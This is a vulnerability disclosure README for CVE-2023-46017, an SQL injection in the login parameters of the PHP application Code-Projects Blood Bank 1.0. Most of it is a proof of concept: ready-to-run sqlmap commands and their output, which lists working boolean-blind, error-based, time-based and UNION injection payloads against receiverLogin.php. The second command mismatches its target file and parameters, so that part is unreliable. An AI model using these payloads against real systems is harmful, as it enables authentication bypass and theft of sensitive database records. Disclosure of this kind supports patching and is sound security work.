# CVE-2023-46017-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability
+ Exploit Author: ersinerenler
# Vendor Homepage
+ https://code-projects.org/blood-bank-in-php-with-source-code
# Software Link
+ https://download-media.code-projects.org/2020/11/Blood_Bank_In_PHP_With_Source_code.zip
# Overview
+ Code-Projects Blood Bank V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'remail' and 'rpassword' parameters in the receiverLogin.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
# Vulnerability Details
+ CVE ID: CVE-2023-46017
+ Affected Version: Blood Bank V1.0
+ Vulnerable File: /receiverLogin.php
+ Parameter Names: remail, rpassword
+ Attack Type: Local
# References:
+ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46017
+ https://nvd.nist.gov/vuln/detail/CVE-2023-46017
# Description
+ The lack of proper input validation and sanitization on the 'remail' and 'rpassword' parameters allows an attacker to craft SQL injection queries, bypassing authentication mechanisms and gaining unauthorized access to the database
  
<img width="1113" alt="image" src="https://github.com/ersinerenler/CVE-2023-46017-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/9890e21b-e94b-41af-b868-114315cc3074">

# Proof of Concept (PoC) : 
+ `sqlmap -u "http://localhost/bloodbank/file/receiverLogin.php" --method POST --data "remail=test@test&rpassword=test&rlogin=Login" -p remail --risk 3 --level 5 --dbms mysql --batch --current-db`

```
---
Parameter: remail (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: remail=test@test' AND 1348=(SELECT (CASE WHEN (1348=1348) THEN 1348 ELSE (SELECT 5898 UNION SELECT 1310) END))-- -&rpassword=test&rlogin=Login

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: remail=test@test' OR (SELECT 9644 FROM(SELECT COUNT(*),CONCAT(0x7170707171,(SELECT (ELT(9644=9644,1))),0x7178706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- HyEh&rpassword=test&rlogin=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: remail=test@test' AND (SELECT 5587 FROM (SELECT(SLEEP(5)))hWQj)-- NUfN&rpassword=test&rlogin=Login

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: remail=test@test' UNION ALL SELECT NULL,CONCAT(0x7170707171,0x4e764e5452486270544a6e4c705a79535a667441756d556b416e7961484a534a647542597a61466f,0x7178706271),NULL,NULL,NULL,NULL,NULL-- -&rpassword=test&rlogin=Login
---
```
+ `sqlmap -u "http://localhost/bloodbank/file/hospitalLogin.php" --method POST --data "hemail=test@test&hpassword=test&hlogin=Login" -p rpassword --risk 3 --level 3 --dbms mysql --batch --current-db`

```
---
Parameter: rpassword (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: remail=test@test&rpassword=test' AND 9149=(SELECT (CASE WHEN (9149=9149) THEN 9149 ELSE (SELECT 9028 UNION SELECT 5274) END))-- -&rlogin=Login

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: remail=test@test&rpassword=test' OR (SELECT 6087 FROM(SELECT COUNT(*),CONCAT(0x7170707171,(SELECT (ELT(6087=6087,1))),0x7178706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- VRqW&rlogin=Login

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: remail=test@test&rpassword=test' AND (SELECT 4449 FROM (SELECT(SLEEP(5)))eegb)-- Cuoy&rlogin=Login

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: remail=test@test&rpassword=test' UNION ALL SELECT NULL,CONCAT(0x7170707171,0x6e686d776376736a706f47796d474a736a48566f72625a4e6d537247665a444f684154684b476d62,0x7178706271),NULL,NULL,NULL,NULL,NULL-- -&rlogin=Login
---
```

+ current database: `bloodbank`
<img width="1447" alt="image" src="https://github.com/ersinerenler/CVE-2023-46017-Code-Projects-Blood-Bank-1.0-SQL-Injection-Vulnerability/assets/113091631/9806c5a1-b9ab-4822-9fd3-df4f76e1f97a">

